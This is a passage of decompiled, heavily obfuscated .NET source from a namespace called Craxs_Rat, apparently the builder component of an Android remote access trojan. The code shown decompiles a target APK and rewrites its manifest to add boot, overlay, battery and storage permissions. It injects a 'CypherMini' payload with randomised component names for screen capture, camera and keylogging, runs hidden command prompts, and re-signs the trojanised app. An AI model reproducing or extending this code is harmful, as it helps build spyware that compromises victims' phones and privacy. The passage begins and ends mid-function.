            case 41:
              command2 = EXGuarder.\u003515A2A10 + ((PermissionsManager) this).Apksignerpath + EXGuarder.\u0033867343F + ((PermissionsManager) this).WorkingDir + EXGuarder.\u0035D2B0C04 + ((PermissionsManager) this).WorkingDir + EXGuarder.\u00316157569 + ((PermissionsManager) this).WorkingDir + EXGuarder.\u00306654A62 + ((PermissionsManager) this).originalapkname.Replace(EXGuarder.\u0036F6A5A2B, EXGuarder.\u0033C213A23) + EXGuarder.\u0034F114E08 + path1 + EXGuarder.\u003383C693C;
              num1 = (int) num3 * -189659654 ^ -446578806;
              continue;
            case 42:
              int num16 = ((PermissionsManager) this).Once ? 291084912 : (num16 = -962811381);
              num1 = num16 ^ (int) num3 * -805231452;
              continue;
            case 43:
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) this, __methodptr(_Lambda\u0024__287\u002D6)));
              num1 = (int) num3 * 2130324011 ^ -1361990659;
              continue;
            case 44:
              int num17;
              num1 = num17 = !File.Exists(path2) | !((PermissionsManager) this).protectfinished ? 2037518330 : (num17 = -1303227484);
              continue;
            case 45:
              ((PermissionsManager) TargetObject).\u0024VB\u0024Local_msg = e.Data;
              int num18 = !((PermissionsManager) TargetObject).\u0024VB\u0024Local_msg.Contains(EXGuarder.\u0033E18742D) ? 1732493636 : (num18 = -793737864);
              num1 = num18 ^ (int) num3 * 1245523799;
              continue;
            case 46:
              int num19;
              num1 = num19 = !((PermissionsManager) TargetObject).\u0024VB\u0024Local_msg.Contains(EXGuarder.\u00305345256) ? 192985584 : (num19 = 483547408);
              continue;
            case 47:
              File.WriteAllBytes(((PermissionsManager) this).Apksignerpath, Craxs_Rat.My.Resources.Resources.signapk);
              File.WriteAllBytes(((PermissionsManager) this).ApkZIPpath, Craxs_Rat.My.Resources.Resources.zipalign);
              File.WriteAllBytes(((PermissionsManager) this).Apkeditorpath, Craxs_Rat.My.Resources.Resources.APKEditor);
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) this, __methodptr(_Lambda\u0024__287\u002D5)));
              this.ExecuteCommand(EXGuarder.\u00319202A13 + ((PermissionsManager) this).WorkingDir);
              num1 = (int) num3 * 1073476705 ^ 1084522154;
              continue;
            case 48:
              ((PermissionsManager) TargetObject).\u0024VB\u0024Me = this;
              num1 = (int) num3 * -1708062869 ^ -1108469489;
              continue;
            case 49:
              ((PermissionsManager) this).protectfinished = true;
              num1 = (int) num3 * -1589192223 ^ -1414322572;
              continue;
            case 50:
              File.Delete(path1);
              num1 = (int) num3 * -156889819 ^ -1489779096;
              continue;
            case 51:
              num4 = 1;
              num1 = (int) num3 * 1724310347 ^ -1894063469;
              continue;
            case 52:
              Thread.Sleep(1000);
              num1 = -476854264;
              continue;
            case 53:
              File.Copy(this.TargetApktext.Text, ((PermissionsManager) this).WorkingDir + EXGuarder.\u0036208175F);
              num1 = (int) num3 * -887277239 ^ -1705217022;
              continue;
            case 54:
              this.StopCommandPrompt();
              num1 = (int) num3 * 2085842191 ^ -2105811222;
              continue;
            case 55:
              this.ExecuteCommand(command1);
              num1 = (int) num3 * 167090989 ^ 1593466339;
              continue;
            case 56:
              num1 = (int) num3 * -388738799 ^ -875425658;
              continue;
            case 57:
              this.ExecuteCommand(command3);
              num1 = (int) num3 * 664376232 ^ 1623840802;
              continue;
            case 58:
              Application.DoEvents();
              num1 = (int) num3 * -995008096 ^ -1518322257;
              continue;
            case 59:
              command1 = ((PermissionsManager) this).ApkZIPpath + EXGuarder.\u00379266804 + ((PermissionsManager) this).outputapk + EXGuarder.\u0034F114E08 + ((PermissionsManager) this).outputapk.Replace(EXGuarder.\u0031A243215, EXGuarder.\u00360001C14) + EXGuarder.\u003383C693C;
              num1 = (int) num3 * 1769969382 ^ 203388381;
              continue;
            case 60:
              int num20;
              num1 = num20 = !((PermissionsManager) TargetObject).\u0024VB\u0024Local_msg.Contains(EXGuarder.\u0033F493603) ? -1131415557 : (num20 = -1345867901);
              continue;
            default:
              goto label_64;
          }
        }
label_68:
        return;
label_64:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        // ISSUE: variable of a compiler-generated type
        Jector._Closure\u0024__287\u002D1 closure2871;
        // ISSUE: object of a compiler-generated type is created
        // ISSUE: variable of a compiler-generated type
        Jector._Closure\u0024__287\u002D1 TargetObject = (Jector._Closure\u0024__287\u002D1) new Jector._Closure\u0024__287\u002D0(closure2871);
        ((PermissionsManager) TargetObject).\u0024VB\u0024Me = this;
        Exception exception = ex;
        ((PermissionsManager) TargetObject).\u0024VB\u0024Local_ex = exception;
label_66:
        int num21 = -942961408;
        while (true)
        {
          int num22 = num21;
          uint num23;
          switch ((num23 = (uint) (-((--1972829669 - --766046073 + (-716585735 - 67024223 + 1332236141 * 269309180) - (num22 * 1781414195 ^ 1692095111 * 1311627935 - -(~-589988725 ^ 1187730831 * 1851040337))) * -831317883) ^ -604088741)) % 4U)
          {
            case 0:
              ProjectData.ClearProjectError();
              num21 = (int) num23 * -1391303878 ^ 522623989;
              continue;
            case 1:
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__10)));
              num21 = (int) num23 * 123193253 ^ 631677866;
              continue;
            case 2:
              goto label_4;
            case 3:
              goto label_66;
            default:
              goto label_72;
          }
        }
label_4:
        return;
label_72:;
      }
    }

    private void StopCommandPrompt()
    {
      try
      {
        ((PermissionsManager) this).cmdProcess.CloseMainWindow();
        ((PermissionsManager) this).cmdProcess.Close();
label_1:
        int num1 = -972884609;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-num1 ^ ~1464160100 - -(-732511168 - 1808863387 ^ -1995480825 ^ -404137267)) + -(1638919044 ^ -1440349975) * -671783021)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              ((PermissionsManager) this).cmdProcess.Dispose();
              num1 = (int) num2 * -964993337 ^ -1425208310;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void ExecuteCommand(string command)
    {
      ((PermissionsManager) this).cmdProcess.StandardInput.WriteLine(command);
label_1:
      int num1 = -1862636567;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) -(~(98443849 * ((-311890805 ^ -1049885362) * 1947988215) - -num2 * -630514611) ^ ~2015210648)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            ((PermissionsManager) this).cmdProcess.StandardInput.Flush();
            num1 = (int) num3 * 281692545 ^ -895786211;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public void Startwork()
    {
      string randomFolderName;
      if (this.CheckAutomatic.Checked)
      {
label_1:
        int num1 = -1871563644;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num2 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              this.log.AppendText(Environment.NewLine + EXGuarder.\u003244C343F);
              this.log.AppendText(Environment.NewLine + EXGuarder.\u0033A571925);
              ((PermissionsManager) this).HoldMainThread = true;
              num1 = (int) num3 * 2059848 ^ 573306298;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        Codes.GetDriv();
        try
        {
          randomFolderName = Codes.GenerateRandomFolderName(EXGuarder.\u00379287474);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Exception exception = ex;
label_7:
          int num4 = 668052070;
          while (true)
          {
            int num5 = num4;
            uint num6;
            switch ((num6 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num5 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 3U)
            {
              case 0:
                goto label_7;
              case 1:
                goto label_310;
              case 2:
                this.log.AppendText(EXGuarder.\u0032F726A2C + exception.Message);
                ProjectData.ClearProjectError();
                num4 = (int) num6 * -1093757863 ^ 901027433;
                continue;
              default:
                goto label_306;
            }
          }
label_310:
          return;
label_306:
          return;
        }
        ((PermissionsManager) this).WorkingDir = randomFolderName;
      }
      else
        goto label_15;
label_11:
      int num7 = 1933425533;
label_12:
      while (true)
      {
        int num8 = num7;
        uint num9;
        ProcessStartInfo processStartInfo;
        switch ((num9 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num8 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 27U)
        {
          case 0:
            ((PermissionsManager) this).cmdProcess.BeginErrorReadLine();
            num7 = (int) num9 * 151207568 ^ -274088838;
            continue;
          case 1:
            ((PermissionsManager) this).cmdProcess.StartInfo = processStartInfo;
            ((PermissionsManager) this).cmdProcess.OutputDataReceived += new DataReceivedEventHandler(this.cmdOutputHandler);
            ((PermissionsManager) this).cmdProcess.ErrorDataReceived += new DataReceivedEventHandler(this.cmdOutputHandler);
            num7 = (int) num9 * -2080224398 ^ -1139632640;
            continue;
          case 2:
            goto label_11;
          case 3:
            this.TheApkPath = ((PermissionsManager) this).WorkingDir + EXGuarder.\u00376361276;
            int num10 = Directory.Exists(this.TheApkPath) ? -1117970577 : (num10 = -278384177);
            num7 = num10 ^ (int) num9 * -975051241;
            continue;
          case 4:
            ((PermissionsManager) this).apktoolpath = randomFolderName + EXGuarder.\u0031B452071;
            num7 = (int) num9 * -1518466958 ^ -380780973;
            continue;
          case 5:
            ((PermissionsManager) this).cmdProcess.Start();
            num7 = (int) num9 * 319556477 ^ -1848881311;
            continue;
          case 6:
            Thread.Sleep(1);
            num7 = 817425938;
            continue;
          case 7:
            this.ExecuteCommand(EXGuarder.\u003585C3517);
            num7 = (int) num9 * 1724665998 ^ -938858185;
            continue;
          case 8:
            this.log.AppendText(Environment.NewLine + EXGuarder.\u003590C2D33);
            num7 = 1570108038;
            continue;
          case 9:
            processStartInfo.FileName = EXGuarder.\u00350051F1D;
            processStartInfo.RedirectStandardOutput = true;
            num7 = (int) num9 * 2128591713 ^ -156519014;
            continue;
          case 11:
            int num11;
            num7 = num11 = Codes.FileInUse(this.TheApkPath + EXGuarder.\u0032E680D5C) | !File.Exists(this.TheApkPath + EXGuarder.\u0032E680D5C) ? -104407186 : (num11 = 669050868);
            continue;
          case 12:
            ((PermissionsManager) this).cmdProcess.BeginOutputReadLine();
            num7 = (int) num9 * 729171780 ^ 484207732;
            continue;
          case 13:
            ((PermissionsManager) this).Apksignerpath = randomFolderName + EXGuarder.\u00312183E19;
            ((PermissionsManager) this).ApkZIPpath = randomFolderName + EXGuarder.\u00333195917;
            num7 = (int) num9 * 567432946 ^ 1646897285;
            continue;
          case 14:
            Application.DoEvents();
            num7 = (int) num9 * 643369952 ^ 1807241534;
            continue;
          case 15:
            processStartInfo = new ProcessStartInfo();
            num7 = (int) num9 * 1686404471 ^ 1653398788;
            continue;
          case 16:
            Directory.CreateDirectory(this.TheApkPath);
            num7 = (int) num9 * -401419921 ^ -643369866;
            continue;
          case 17:
            int num12 = ((PermissionsManager) this).HoldMainThread ? -1510970233 : (num12 = -464883466);
            num7 = num12 ^ (int) num9 * -1637415956;
            continue;
          case 18:
            num7 = (int) num9 * -1022864889 ^ -489484238;
            continue;
          case 19:
            ((PermissionsManager) this).Apkeditorpath = randomFolderName + EXGuarder.\u00329455629;
            num7 = (int) num9 * -984774663 ^ 2127144041;
            continue;
          case 20:
            goto label_15;
          case 21:
            processStartInfo.RedirectStandardError = true;
            processStartInfo.UseShellExecute = false;
            num7 = (int) num9 * 604821745 ^ -1637754650;
            continue;
          case 22:
            processStartInfo.RedirectStandardInput = true;
            num7 = (int) num9 * -913933441 ^ 873603400;
            continue;
          case 23:
            ((PermissionsManager) this).apktemp = randomFolderName + EXGuarder.\u00341041126;
            num7 = (int) num9 * 214358877 ^ -1492212192;
            continue;
          case 24:
            ((PermissionsManager) this).cmdProcess = new Process();
            num7 = -588502066;
            continue;
          case 25:
            processStartInfo.CreateNoWindow = true;
            processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            ((PermissionsManager) this).cmdProcess.EnableRaisingEvents = true;
            num7 = (int) num9 * 382994324 ^ -449532927;
            continue;
          case 26:
            Thread.Sleep(1000);
            num7 = 1570108038;
            continue;
          default:
            goto label_38;
        }
      }
label_38:
      string str1 = this.UpdateVersions(File.ReadAllText(this.TheApkPath + EXGuarder.\u0032E680D5C));
      try
      {
        if (str1.ToLower().Contains(EXGuarder.\u00318631869.ToLower()))
          goto label_55;
label_40:
        int num13 = 638253767;
label_41:
        while (true)
        {
          int num14 = num13;
          uint num15;
          string[] strArray1;
          string[] strArray2;
          int index;
          switch ((num15 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num14 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 20U)
          {
            case 0:
              int num16;
              num13 = num16 = str1.ToLower().Contains(EXGuarder.\u0032E320A4E.ToLower()) ? 1368381951 : (num16 = 1612463479);
              continue;
            case 1:
              ((NotificationMaker) this).need_forground = true;
              num13 = (int) num15 * -1760202939 ^ -934891115;
              continue;
            case 2:
              if (Operators.CompareString(this.ComboPrims.Text, EXGuarder.\u003445D2651, false) != 0)
              {
                num13 = -1952042142;
                continue;
              }
              goto label_72;
            case 3:
              ((NotificationMaker) this).need_read = true;
              num13 = (int) num15 * 1361876337 ^ 1770669336;
              continue;
            case 4:
              ((PermissionsManager) this).need_all = true;
              num13 = (int) num15 * 239009705 ^ -1340998399;
              continue;
            case 5:
              ((PermissionsManager) this).need_syswinow = true;
              num13 = (int) num15 * -543246182 ^ -768007759;
              continue;
            case 6:
              ((NotificationMaker) this).need_battery = true;
              num13 = (int) num15 * 524096087 ^ -481329400;
              continue;
            case 7:
              int num17;
              num13 = num17 = str1.ToLower().Contains(EXGuarder.\u00321773C63.ToLower()) ? 57075272 : (num17 = 117023997);
              continue;
            case 8:
              goto label_40;
            case 9:
              strArray2 = strArray1;
              num13 = (int) num15 * -1928456122 ^ 1710774917;
              continue;
            case 10:
              int num18;
              num13 = num18 = str1.ToLower().Contains(EXGuarder.\u0034F79064D.ToLower()) ? 542359355 : (num18 = 1899968605);
              continue;
            case 11:
              index = 0;
              num13 = (int) num15 * 310378070 ^ 2025703512;
              continue;
            case 12:
              goto label_55;
            case 14:
              strArray1 = Craxs_Rat.My.Resources.Resources.ALLPRIM.Split('#');
              num13 = (int) num15 * 554995351 ^ 1058080347;
              continue;
            case 15:
              ((NotificationMaker) this).need_write = true;
              num13 = (int) num15 * 1528183656 ^ 1226588950;
              continue;
            case 16:
              if (index < strArray2.Length)
              {
                num13 = -359852835;
                continue;
              }
              goto label_72;
            case 17:
              ((PermissionsManager) this).ASKPRIM_all = true;
              num13 = (int) num15 * 1343109261 ^ -1584613395;
              continue;
            case 18:
              ((PermissionsManager) this).need_boot = true;
              num13 = (int) num15 * -859730880 ^ 1088857540;
              continue;
            case 19:
              int num19;
              num13 = num19 = str1.ToLower().Contains(EXGuarder.\u0031A1F6752.ToLower()) ? -579673532 : (num19 = -542099204);
              continue;
            default:
              string str2 = strArray2[index];
              try
              {
                if (!string.IsNullOrEmpty(str2))
                {
label_64:
                  int num20 = 1818054057;
                  while (true)
                  {
                    int num21 = num20;
                    uint num22;
                    switch ((num22 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num21 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 4U)
                    {
                      case 0:
                        ((NotificationMaker) this).ALLPRIMSLIST.Add(str2);
                        num20 = (int) num22 * 638565956 ^ -748443116;
                        continue;
                      case 1:
                        int num23 = str1.ToLower().Contains(str2.ToLower()) ? 1778704540 : (num23 = -571777814);
                        num20 = num23 ^ (int) num22 * -1548241880;
                        continue;
                      case 3:
                        goto label_64;
                      default:
                        goto label_69;
                    }
                  }
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
label_69:
              checked { ++index; }
              goto case 16;
          }
        }
label_72:
        this.log.AppendText(Environment.NewLine + EXGuarder.\u00313112551);
        int num24 = 1206821064;
        string[] contents1;
        while (true)
        {
          int num25 = num24;
          uint num26;
          int index1;
          string[] contents2;
          int index2;
          int num27;
          int num28;
          int num29;
          switch ((num26 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num25 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 51U)
          {
            case 0:
              num24 = -480863797;
              continue;
            case 1:
              ((PermissionsManager) this).need_syswinow = false;
              num24 = (int) num26 * -657359804 ^ -548065021;
              continue;
            case 2:
              int num30 = !contents1[index1].ToLower().Contains(EXGuarder.\u0033F6C1B2F) ? -1500298522 : (num30 = 1770044385);
              num24 = num30 ^ (int) num26 * -2070089754;
              continue;
            case 3:
              int num31;
              num24 = num31 = !((NotificationMaker) this).need_write ? 752548073 : (num31 = 1913823923);
              continue;
            case 4:
              int num32;
              num24 = num32 = Codes.FileInUse(this.TheApkPath + EXGuarder.\u003644D3253) | !File.Exists(this.TheApkPath + EXGuarder.\u003644D3253) ? 1213344526 : (num32 = 1537744860);
              continue;
            case 5:
              int num33;
              num24 = num33 = index2 <= num28 ? -1785184739 : (num33 = 325878116);
              continue;
            case 6:
              index1 = 1;
              num24 = (int) num26 * -363372829 ^ 2015604325;
              continue;
            case 7:
              ((KeyboardManager) this).N__SCRActivity_ = Conversions.ToString(this.RandommMad(25, 35));
              num24 = (int) num26 * -1903432909 ^ 1248842238;
              continue;
            case 8:
              num27 = checked (contents1.Length - 1);
              num24 = -1278289096;
              continue;
            case 9:
              int num34;
              num24 = num34 = !((PermissionsManager) this).need_syswinow ? 1904987715 : (num34 = -1842291411);
              continue;
            case 10:
              int num35 = !contents1[index1].ToLower().Contains(EXGuarder.\u0033F6C1B2F) ? -1239740401 : (num35 = -735273112);
              num24 = num35 ^ (int) num26 * -1126824270;
              continue;
            case 11:
              num24 = (int) num26 * 2021414946 ^ 966433688;
              continue;
            case 12:
              int num36;
              num24 = num36 = !((NotificationMaker) this).need_read ? -852084701 : (num36 = -2022445815);
              continue;
            case 13:
              ((KeyboardManager) this).N_ClassGen = Conversions.ToString(this.RandommMad(25, 35));
              ((KeyboardManager) this).N_cap_sc_ = Conversions.ToString(this.RandommMad(25, 35));
              // ISSUE: reference to a compiler-generated field
              ((Jector._Closure\u0024__287\u002D1) this).N__srv_worker_ = Conversions.ToString(this.RandommMad(25, 35));
              // ISSUE: reference to a compiler-generated field
              ((Jector._Closure\u0024__287\u002D0) this).N_newEngineWorkerins = Conversions.ToString(this.RandommMad(25, 35));
              num24 = (int) num26 * -1582524642 ^ -965407631;
              continue;
            case 14:
              ((NotificationMaker) this).need_forground = false;
              num24 = (int) num26 * 1496826083 ^ -456068554;
              continue;
            case 15:
              contents1[index1] = contents1[index1] + EXGuarder.\u00377146957 + Craxs_Rat.My.Resources.Resources.SystemwindowPrim;
              num24 = (int) num26 * -226114142 ^ -1049541230;
              continue;
            case 16:
              File.WriteAllLines(this.TheApkPath + EXGuarder.\u003644D3253, contents2);
              num24 = (int) num26 * -1456638459 ^ 28168172;
              continue;
            case 17:
              ((LanguageSelector) this).N__webviewer_ = Conversions.ToString(this.RandommMad(25, 35));
              int num37 = !this.checkkeepscreen.Checked ? -1938635668 : (num37 = -47802653);
              num24 = num37 ^ (int) num26 * -1262684489;
              continue;
            case 18:
              index2 = 0;
              num24 = (int) num26 * 1966287888 ^ 547183268;
              continue;
            case 19:
              int num38;
              num24 = num38 = !((NotificationMaker) this).need_forground ? 224849026 : (num38 = 1528179102);
              continue;
            case 20:
              contents1 = File.ReadAllLines(this.TheApkPath + EXGuarder.\u0032E680D5C);
              num24 = -1521861846;
              continue;
            case 21:
              contents2 = File.ReadAllLines(this.TheApkPath + EXGuarder.\u003644D3253);
              num24 = (int) num26 * 1850418491 ^ 233813617;
              continue;
            case 22:
              int num39 = !contents1[index1].ToLower().Contains(EXGuarder.\u0033F6C1B2F) ? -761508328 : (num39 = -1788495719);
              num24 = num39 ^ (int) num26 * -1965605885;
              continue;
            case 23:
              contents1[index1] = contents1[index1] + EXGuarder.\u00377146957 + Craxs_Rat.My.Resources.Resources.FORGROUD;
              num24 = (int) num26 * 786894448 ^ 1323562310;
              continue;
            case 24:
              int num40;
              num24 = num40 = !((NotificationMaker) this).need_battery ? -328442966 : (num40 = 570222856);
              continue;
            case 25:
              ((LanguageSelector) this).N__scctrl_ = Conversions.ToString(this.RandommMad(25, 35));
              ((KeyboardManager) this).N_WackMeUpJob = Conversions.ToString(this.RandommMad(25, 35));
              ((KeyboardManager) this).N__ask_draw_ = Conversions.ToString(this.RandommMad(25, 35));
              ((KeyboardManager) this).N__ask_battary_ = Conversions.ToString(this.RandommMad(25, 35));
              ((KeyboardManager) this).N__CamActivity_ = Conversions.ToString(this.RandommMad(25, 35));
              num24 = (int) num26 * -1370449486 ^ -551868904;
              continue;
            case 26:
              int num41 = !contents1[index1].ToLower().Contains(EXGuarder.\u0033F6C1B2F) ? -41133290 : (num41 = -1278444741);
              num24 = num41 ^ (int) num26 * -1538024591;
              continue;
            case 27:
              checked { ++index2; }
              num24 = (int) num26 * 1388883374 ^ -741107201;
              continue;
            case 28:
              contents1[index1] = contents1[index1] + EXGuarder.\u00377146957 + Craxs_Rat.My.Resources.Resources.BootPrim;
              num24 = (int) num26 * -1553259091 ^ -1875245091;
              continue;
            case 29:
              contents2[index2] = EXGuarder.\u0030B265F0F;
              num24 = -510708288;
              continue;
            case 30:
              contents1[index1] = contents1[index1] + EXGuarder.\u00377146957 + Craxs_Rat.My.Resources.Resources.batteryprim;
              ((NotificationMaker) this).need_battery = false;
              num24 = (int) num26 * -138305059 ^ 2065468591;
              continue;
            case 31:
              Thread.Sleep(1000);
              num24 = -1978606424;
              continue;
            case 32:
              this.N__access_ask_ = Conversions.ToString(this.RandommMad(25, 35));
              this.N__ask_prim_ = Conversions.ToString(this.RandommMad(25, 35));
              ((KeyboardManager) this).N_update_app_ = Conversions.ToString(this.RandommMad(25, 35));
              num24 = (int) num26 * 959056869 ^ 1640063549;
              continue;
            case 33:
              contents1[index1] = contents1[index1] + EXGuarder.\u00377146957 + Craxs_Rat.My.Resources.Resources.WritePrim;
              num24 = (int) num26 * -295207580 ^ 547718784;
              continue;
            case 34:
              goto label_72;
            case 35:
              int num42 = !contents1[index1].ToLower().Contains(EXGuarder.\u0033F6C1B2F) ? 304998782 : (num42 = 1502639155);
              num24 = num42 ^ (int) num26 * -1340236703;
              continue;
            case 36:
              if (((PermissionsManager) this).need_all)
              {
                num24 = 1993299356;
                continue;
              }
              goto label_137;
            case 37:
              num24 = (int) num26 * -555533176 ^ -1756572658;
              continue;
            case 38:
              ((NotificationMaker) this).KeepScreen = EXGuarder.\u0033A0E5657;
              num24 = (int) num26 * -225343360 ^ -986797206;
              continue;
            case 39:
              int num43;
              num24 = num43 = !((PermissionsManager) this).need_boot ? 1212701278 : (num43 = 335457428);
              continue;
            case 40:
              int num44;
              num24 = num44 = contents2[index2].ToLower().Contains(EXGuarder.\u0036D051B32.ToLower()) ? 1903230790 : (num44 = -568650197);
              continue;
            case 41:
              int num45 = !contents1[index1].ToLower().Contains(EXGuarder.\u0033F6C1B2F) ? 1185996074 : (num45 = -1620391912);
              num24 = num45 ^ (int) num26 * -90551874;
              continue;
            case 42:
              ((PermissionsManager) this).need_boot = false;
              num24 = (int) num26 * 1217476657 ^ -1757931523;
              continue;
            case 43:
              ((NotificationMaker) this).need_write = false;
              num24 = (int) num26 * 858863711 ^ -153213489;
              continue;
            case 44:
              ((NotificationMaker) this).need_read = false;
              num24 = (int) num26 * 1418140227 ^ -1649989774;
              continue;
            case 45:
              num24 = (int) num26 * 1059338326 ^ -282994479;
              continue;
            case 46:
              num28 = checked (contents2.Length - 1);
              num24 = (int) num26 * 1135940432 ^ -144249795;
              continue;
            case 47:
              contents1[index1] = contents1[index1] + EXGuarder.\u00377146957 + Craxs_Rat.My.Resources.Resources.ReadPrim;
              num24 = (int) num26 * 375924494 ^ -1247741701;
              continue;
            case 48:
              ((NotificationMaker) this).cou = this.GenerateRandomNumber(0, 5000);
              num24 = (int) num26 * 1913172219 ^ 668599947;
              continue;
            case 50:
label_138:
              if (index1 > num27)
              {
                num29 = 858921021;
                goto label_132;
              }
              else
                goto case 3;
            default:
              if (contents1[index1].ToLower().Contains(EXGuarder.\u0033F6C1B2F))
              {
                List<string>.Enumerator enumerator;
                try
                {
                  enumerator = ((NotificationMaker) this).ALLPRIMSLIST.GetEnumerator();
label_123:
                  int num46 = -1559096568;
                  while (true)
                  {
                    int num47 = num46;
                    uint num48;
                    string current;
                    switch ((num48 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num47 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 6U)
                    {
                      case 1:
                        current = enumerator.Current;
                        num46 = -904882374;
                        continue;
                      case 2:
                        contents1[index1] = contents1[index1] + EXGuarder.\u00377146957 + current;
                        num46 = (int) num48 * -532539086 ^ -1270428783;
                        continue;
                      case 3:
                        int num49;
                        num46 = num49 = enumerator.MoveNext() ? 241871281 : (num49 = 348983974);
                        continue;
                      case 4:
                        num46 = (int) num48 * 12082285 ^ 388190363;
                        continue;
                      case 5:
                        goto label_123;
                      default:
                        goto label_130;
                    }
                  }
                }
                finally
                {
                  enumerator.Dispose();
                }
label_130:
                ((PermissionsManager) this).need_all = false;
                break;
              }
              goto label_137;
          }
label_131:
          num29 = -1211332528;
label_132:
          while (true)
          {
            int num50 = num29;
            uint num51;
            switch ((num51 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num50 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 9U)
            {
              case 0:
                checked { ++index1; }
                num29 = (int) num51 * 52814524 ^ 64965047;
                continue;
              case 1:
                int num52;
                num29 = num52 = contents1[index1].ToLower().Contains(EXGuarder.\u00309345724.ToLower()) ? -99613885 : (num52 = 1828270352);
                continue;
              case 2:
                goto label_131;
              case 3:
                goto label_137;
              case 4:
                goto label_138;
              case 5:
                contents1[index1] = contents1[index1].Replace(EXGuarder.\u00334774C35, EXGuarder.\u0033900364F);
                num29 = (int) num51 * -1715293008 ^ 306789027;
                continue;
              case 6:
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                contents1[index1] = contents1[index1] + Environment.NewLine + Craxs_Rat.My.Resources.Resources.CypherMini.Replace(EXGuarder.\u003560F2D2C, this.N__ask_prim_).Replace(EXGuarder.\u0035B255E07, this.N__access_ask_).Replace(EXGuarder.\u003755E1C24, ((Jector._Closure\u0024__287\u002D0) this).N_newEngineWorkerins).Replace(EXGuarder.\u0035E283C57, ((Jector._Closure\u0024__287\u002D1) this).N__srv_worker_).Replace(EXGuarder.\u0036240654C, ((KeyboardManager) this).N_cap_sc_).Replace(EXGuarder.\u00316292955, ((KeyboardManager) this).N_update_app_).Replace(EXGuarder.\u00377422707, ((LanguageSelector) this).N__webviewer_).Replace(EXGuarder.\u00344697106, ((KeyboardManager) this).N__SCRActivity_).Replace(EXGuarder.\u0035D450206, ((KeyboardManager) this).N__CamActivity_).Replace(EXGuarder.\u0034151693C, ((KeyboardManager) this).N__ask_battary_).Replace(EXGuarder.\u00302330D44, ((LanguageSelector) this).N__scctrl_).Replace(EXGuarder.\u0035E550E6A, ((KeyboardManager) this).N_ClassGen).Replace(EXGuarder.\u00358635449, ((KeyboardManager) this).N__ask_draw_).Replace(EXGuarder.\u0033748544A, ((KeyboardManager) this).N_WackMeUpJob);
                num29 = 596275612;
                continue;
              case 8:
                num29 = (int) num51 * -1170080995 ^ -1700297175;
                continue;
              default:
                goto label_141;
            }
          }
label_137:
          num29 = contents1[index1].ToLower().Contains(EXGuarder.\u00334774C35) ? 1909796809 : (num29 = -1288294095);
          goto label_132;
        }
label_141:
        File.WriteAllLines(this.TheApkPath + EXGuarder.\u0032E680D5C, contents1);
        goto label_143;
label_55:
        num13 = str1.ToLower().Contains(EXGuarder.\u00317272770.ToLower()) ? -1842023662 : (num13 = 883231332);
        goto label_41;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.log.AppendText(EXGuarder.\u0033E5E1749 + exception.Message);
        ProjectData.ClearProjectError();
      }
label_143:
      string destinationDirectoryName = (string) null;
      try
      {
        this.log.AppendText(Environment.NewLine + EXGuarder.\u003416F1D53);
        int num53 = 2;
label_145:
        int num54 = 1571958704;
        while (true)
        {
          int num55 = num54;
          uint num56;
          switch ((num56 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num55 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 16U)
          {
            case 0:
